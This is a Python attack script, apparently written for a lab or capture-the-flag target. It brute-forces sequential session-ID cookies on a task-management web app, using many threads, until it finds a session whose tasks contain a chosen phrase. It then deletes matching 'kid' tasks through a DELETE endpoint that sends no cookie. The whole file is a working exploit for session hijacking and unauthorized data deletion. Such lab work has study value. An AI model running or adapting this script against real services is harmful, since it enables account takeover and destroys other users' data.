import requests
import threading

domain = 'http://172.20.20.16:5000'

proxies = {
    "http": "http://127.0.0.1:3128",
    "https": "http://127.0.0.1:3128",
}

def check_task(session_id, phrase):
    url = f'{domain}/tasks'
    headers = {'Cookie': f'sessionID={session_id}'}
    response = requests.get(url, headers=headers)
    if phrase.lower() in response.text.lower():
        return response.text
    else:
        return None

def findTask(phrase, end, start=1, stop_event=None, result_holder=None, checked = None):
    if end < start:
        raise ValueError("End must be greater than or equal to start")
    id = start
    response = None
    while response is None and id < end:
        if stop_event and stop_event.is_set():
            return  # Stop if another thread found the result
        print(f"[Thread {start}-{end-1}] Checking ID: {id}")
        try:
            response = check_task(id, phrase)
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
        if response is not None:
            if id not in checked or checked is None:
                print(f"[Thread {start}-{end-1}] Found phrase in ID: {id}")
                if result_holder is not None:
                    result_holder['result'] = id
                if stop_event:
                    stop_event.set()
                return
        id += 1
    print(f"[Thread {start}-{end-1}] Finished without finding phrase.")

def deleteKid(session_id):
    url = f'{domain}/tasks?completed=false'
    headers = {'Cookie': f'sessionID={session_id}'}
    response = requests.get(url, headers=headers)
    try:
        tasks = response.json().get('tasks', [])
    except Exception:
        return None

    for task in tasks:
        description = task.get('description', '')
        if "kid".lower() in description.lower():
            taskid = task.get('taskid', '')
            url = f'{domain}/tasks?taskID={taskid}'
            response = requests.delete(url, allow_redirects=False)
            if response.status_code == 200:
                return "Done"
            else:
                return response.text


def multThreadedFindTask(phrase, max_id=500, batch_size=20, checked = None):
    threads = []
    stop_event = threading.Event()
    result_holder = {}
    for start in range(1, max_id + 1, batch_size):
        end = min(start + batch_size, max_id + 1)
        thread = threading.Thread(
            target=findTask,
            args=(phrase, end, start, stop_event, result_holder, checked)
        )
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    return result_holder.get('result', "Phrase not found in any task.")

print("What phrase do you want to search for?")
phrase = input()
print("Searching for tasks with phrase:", phrase)
found = multThreadedFindTask(phrase)
print(f"found in {found}")
deletedKid = deleteKid(found)
tested = [found,]
while(deletedKid is None):
    print('not darth vaders')
    found = multThreadedFindTask(phrase, 500, 20, tested)
    if found is None:
        print("Unable to find")
        break
    deletedKid = deleteKid(found)
    print(deletedKid) 
    tested.append(found)

print("Done")

